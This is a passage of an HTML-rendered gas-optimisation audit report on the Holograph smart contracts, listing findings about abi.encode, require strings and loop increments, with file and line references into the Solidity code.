11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-12] abi.encode() is less efficient than abi.encodePacked()</h2>\n<p>use abi.encodePacked() where possible to save gas</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::252 =&gt; abi.encode(abi.encode(config.chainType, holograph, config.contractType, sourceContractAddress), config.initCode)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::409 =&gt; return (Holographable.bridgeOut.selector, abi.encode(from, to, amount, data));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::471 =&gt; abi.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::260 =&gt; abi.encodeWithSignature(&quot;initPA1D(bytes)&quot;, abi.encode(address(this), uint256(contractBps)))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::426 =&gt; return (Holographable.bridgeOut.selector, abi.encode(from, to, tokenId, data));</span></span></code></pre>\n<h2 id=\"g-13-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g-13-use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g 13 use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] Use custom errors rather than revert()/require() strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save ~50 gas each time they’re hitby avoiding having to allocate and store the revert string. Not defining the strings also save deployment gas</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::148 =&gt; require(msg.sender == address(_operator()), &quot;HOLOGRAPH: operator only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::163 =&gt; require(!_isInitialized(), &quot;HOLOGRAPH: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::214 =&gt; require(selector == Holographable.bridgeIn.selector, &quot;HOLOGRAPH: bridge in failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::233 =&gt; require(doNotRevert, &quot;HOLOGRAPH: reverted&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographBridge.sol::270 =&gt; require(selector == Holographable.bridgeOut.selector, &quot;HOLOGRAPH: bridge out failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::144 =&gt; require(!_isInitialized(), &quot;HOLOGRAPH: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::220 =&gt; require(_verifySigner(signature.r, signature.s, signature.v, hash, signer), &quot;HOLOGRAPH: invalid signature&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographFactory.sol::228 =&gt; require(!_isContract(holographerAddress), &quot;HOLOGRAPH: already deployed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::241 =&gt; require(!_isInitialized(), &quot;HOLOGRAPH: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::309 =&gt; require(_operatorJobs[hash] &gt; 0, &quot;HOLOGRAPH: invalid job&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::350 =&gt; require(timeDifference &gt; 0, &quot;HOLOGRAPH: operator has time&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::354 =&gt; require(gasPrice &gt;= tx.gasprice, &quot;HOLOGRAPH: gas spike detected&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::368 =&gt; require(fallbackOperator == msg.sender, &quot;HOLOGRAPH: invalid fallback&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::415 =&gt; require(gasleft() &gt; gasLimit, &quot;HOLOGRAPH: not enough gas left&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::446 =&gt; require(msg.sender == address(this), &quot;HOLOGRAPH: operator only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::485 =&gt; require(msg.sender == address(_messagingModule()), &quot;HOLOGRAPH: messaging only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::591 =&gt; require(msg.sender == _bridge(), &quot;HOLOGRAPH: bridge only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::595 =&gt; require(hlgFee &lt; msg.value, &quot;HOLOGRAPH: not enough value&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::728 =&gt; require(_operatorPods.length &gt;= pod, &quot;HOLOGRAPH: pod does not exist&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::739 =&gt; require(_operatorPods.length &gt;= pod, &quot;HOLOGRAPH: pod does not exist&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::756 =&gt; require(_operatorPods.length &gt;= pod, &quot;HOLOGRAPH: pod does not exist&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::829 =&gt; require(_bondedOperators[operator] != 0, &quot;HOLOGRAPH: operator not bonded&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::839 =&gt; require(_utilityToken().transferFrom(msg.sender, address(this), amount), &quot;HOLOGRAPH: token transfer failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::857 =&gt; require(_bondedOperators[operator] == 0 &amp;&amp; _bondedAmounts[operator] == 0, &quot;HOLOGRAPH: operator is bonded&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::863 =&gt; require(current &lt;= amount, &quot;HOLOGRAPH: bond amount too small&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::881 =&gt; require(_operatorPods[pod - 1].length &lt; type(uint16).max, &quot;HOLOGRAPH: too many operators&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::889 =&gt; require(_utilityToken().transferFrom(msg.sender, address(this), amount), &quot;HOLOGRAPH: token transfer failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::903 =&gt; require(_bondedOperators[operator] != 0, &quot;HOLOGRAPH: operator not bonded&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::911 =&gt; require(_isContract(operator), &quot;HOLOGRAPH: operator not contract&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::915 =&gt; require(Ownable(operator).isOwner(msg.sender), &quot;HOLOGRAPH: sender not owner&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::932 =&gt; require(_utilityToken().transfer(recipient, amount), &quot;HOLOGRAPH: token transfer failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::117 =&gt; require(msg.sender == holographer(), &quot;ERC20: holographer only&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::123 =&gt; require(msgSender() == _getOwner(), &quot;ERC20: owner only function&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::125 =&gt; require(msg.sender == _getOwner(), &quot;ERC20: owner only function&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC20H.sol::147 =&gt; require(!_isInitialized(), &quot;ERC20: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::117 =&gt; require(msg.sender == holographer(), &quot;ERC721: holographer only&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::123 =&gt; require(msgSender() == _getOwner(), &quot;ERC721: owner only function&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::125 =&gt; require(msg.sender == _getOwner(), &quot;ERC721: owner only function&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/abstract/ERC721H.sol::147 =&gt; require(!_isInitialized(), &quot;ERC721: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::192 =&gt; require(msg.sender == _holograph().getBridge(), &quot;ERC20: bridge only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::204 =&gt; require(msg.sender == sourceContract, &quot;ERC20: source only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::219 =&gt; require(!_isInitialized(), &quot;ERC20: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::241 =&gt; require(sourceContract.init(initCode) == InitializableInterface.init.selector, &quot;ERC20: could not init source&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::349 =&gt; require(currentAllowance &gt;= amount, &quot;ERC20: amount exceeds allowance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::365 =&gt; require(currentAllowance &gt;= subtractedValue, &quot;ERC20: decreased below zero&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::387 =&gt; require(SourceERC20().bridgeIn(fromChain, from, to, amount, data), &quot;HOLOGRAPH: bridge in failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::400 =&gt; require(currentAllowance &gt;= amount, &quot;ERC20: amount exceeds allowance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::427 =&gt; require(newAllowance &gt;= currentAllowance, &quot;ERC20: increased above max value&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::445 =&gt; require(_isContract(account), &quot;ERC20: operator not contract&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::450 =&gt; require(balance &gt;= amount, &quot;ERC20: balance check failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::469 =&gt; require(block.timestamp &lt;= deadline, &quot;ERC20: expired deadline&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::482 =&gt; require(signer == account, &quot;ERC20: invalid signature&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::505 =&gt; require(_checkOnERC20Received(msg.sender, recipient, amount, data), &quot;ERC20: non ERC20Receiver&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::529 =&gt; require(currentAllowance &gt;= amount, &quot;ERC20: amount exceeds allowance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::539 =&gt; require(_checkOnERC20Received(account, recipient, amount, data), &quot;ERC20: non ERC20Receiver&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::599 =&gt; require(currentAllowance &gt;= amount, &quot;ERC20: amount exceeds allowance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::620 =&gt; require(account != address(0), &quot;ERC20: account is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::621 =&gt; require(spender != address(0), &quot;ERC20: spender is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::627 =&gt; require(account != address(0), &quot;ERC20: account is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::629 =&gt; require(accountBalance &gt;= amount, &quot;ERC20: amount exceeds balance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::645 =&gt; require(erc165support, &quot;ERC20: no ERC165 support&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::684 =&gt; require(to != address(0), &quot;ERC20: minting to burn address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::695 =&gt; require(account != address(0), &quot;ERC20: account is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::696 =&gt; require(recipient != address(0), &quot;ERC20: recipient is zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::698 =&gt; require(accountBalance &gt;= amount, &quot;ERC20: amount exceeds balance&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::212 =&gt; require(msg.sender == _holograph().getBridge(), &quot;ERC721: bridge only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::224 =&gt; require(msg.sender == sourceContract, &quot;ERC721: source only call&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::239 =&gt; require(!_isInitialized(), &quot;ERC721: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::258 =&gt; require(sourceContract.init(initCode) == InitializableInterface.init.selector, &quot;ERC721: could not init source&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::263 =&gt; require(success &amp;&amp; selector == InitializableInterface.init.selector, &quot;ERC721: coud not init PA1D&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::323 =&gt; require(_exists(tokenId), &quot;ERC721: token does not exist&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::370 =&gt; require(to != tokenOwner, &quot;ERC721: cannot approve self&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::371 =&gt; require(_isApproved(msg.sender, tokenId), &quot;ERC721: not approved sender&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::388 =&gt; require(_isApproved(msg.sender, tokenId), &quot;ERC721: not approved sender&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::404 =&gt; require(!_exists(tokenId), &quot;ERC721: token already exists&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::408 =&gt; require(SourceERC721().bridgeIn(fromChain, from, to, tokenId, data), &quot;HOLOGRAPH: bridge in failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::419 =&gt; require(to != address(0), &quot;ERC721: zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::420 =&gt; require(_isApproved(sender, tokenId), &quot;ERC721: sender not approved&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::421 =&gt; require(from == _tokenOwner[tokenId], &quot;ERC721: from is not owner&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::458 =&gt; require(_isApproved(msg.sender, tokenId), &quot;ERC721: not approved sender&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::484 =&gt; require(to != msg.sender, &quot;ERC721: cannot approve self&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::513 =&gt; require(!_burnedTokens[token], &quot;ERC721: can&#39;t mint burned token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::622 =&gt; require(_isApproved(msg.sender, tokenId), &quot;ERC721: not approved sender&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::639 =&gt; require(wallet != address(0), &quot;ERC721: zero address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::689 =&gt; require(tokenOwner != address(0), &quot;ERC721: token does not exist&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::700 =&gt; require(index &lt; _allTokens.length, &quot;ERC721: index out of bounds&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::729 =&gt; require(index &lt; balanceOf(wallet), &quot;ERC721: index out of bounds&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::757 =&gt; require(_isContract(_operator), &quot;ERC721: operator not contract&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::762 =&gt; require(tokenOwner == address(this), &quot;ERC721: contract not token owner&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::815 =&gt; require(tokenId &gt; 0, &quot;ERC721: token id cannot be zero&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::816 =&gt; require(to != address(0), &quot;ERC721: minting to burn address&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::817 =&gt; require(!_exists(tokenId), &quot;ERC721: token already exists&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::818 =&gt; require(!_burnedTokens[tokenId], &quot;ERC721: token has been burned&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::869 =&gt; require(_tokenOwner[tokenId] == from, &quot;ERC721: token not owned&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::870 =&gt; require(to != address(0), &quot;ERC721: use burn instead&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::906 =&gt; require(_exists(tokenId), &quot;ERC721: token does not exist&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/Holographer.sol::148 =&gt; require(!_isInitialized(), &quot;HOLOGRAPHER: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/Holographer.sol::166 =&gt; require(success &amp;&amp; selector == InitializableInterface.init.selector, &quot;initialization failed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::159 =&gt; require(isOwner(), &quot;PA1D: caller not an owner&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::174 =&gt; require(!_isInitialized(), &quot;PA1D: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::190 =&gt; require(initialized == 0, &quot;PA1D: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::390 =&gt; require(balance - gasCost &gt; 10000, &quot;PA1D: Not enough ETH to transfer&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::411 =&gt; require(balance &gt; 10000, &quot;PA1D: Not enough tokens to transfer&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::416 =&gt; require(erc20.transfer(addresses[i], sending), &quot;PA1D: Couldn&#39;t transfer token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::435 =&gt; require(balance &gt; 10000, &quot;PA1D: Not enough tokens to transfer&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::439 =&gt; require(erc20.transfer(addresses[i], sending), &quot;PA1D: Couldn&#39;t transfer token&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::460 =&gt; require(matched, &quot;PA1D: sender not authorized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::472 =&gt; require(addresses.length == bps.length, &quot;PA1D: missmatched array lenghts&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::477 =&gt; require(totalBp == 10000, &quot;PA1D: bps down&#39;t equal 10000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::159 =&gt; require(!_isInitialized(), &quot;HOLOGRAPH: already initialized&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/module/LayerZeroModule.sol::235 =&gt; require(msg.sender == address(_operator()), &quot;HOLOGRAPH: operator only call&quot;);</span></span></code></pre>\n<h2 id=\"g-14-prefix-increments-cheaper-than-postfix-increments\" style=\"position:relative;\"><a href=\"#g-14-prefix-increments-cheaper-than-postfix-increments\" aria-label=\"g 14 prefix increments cheaper than postfix increments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-14] Prefix increments cheaper than Postfix increments</h2>\n<p>++i costs less gas than i++, especially when it’s used in for-loops (—i/i— too)\nSaves 5 gas PER LOOP</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::781 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/HolographOperator.sol::871 =&gt; for (uint256 i = _operatorPods.length; i &lt;= pod; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 =&gt; for (uint256 i = 0; i &lt; wallets.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::357 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/HolographERC721.sol::716 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::307 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::323 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::340 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::356 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::394 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::414 =&gt; for (uint256 i = 0; i &lt; length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::437 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::454 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2022-10-holograph/contracts/enforcer/PA1D.sol::474 =&gt; for (uint256 i = 0; i &lt; addresses.length; i++) {</span></span></code></pre>\n<h2 id=\"g-15-use-bytes32-instead-of-string\" 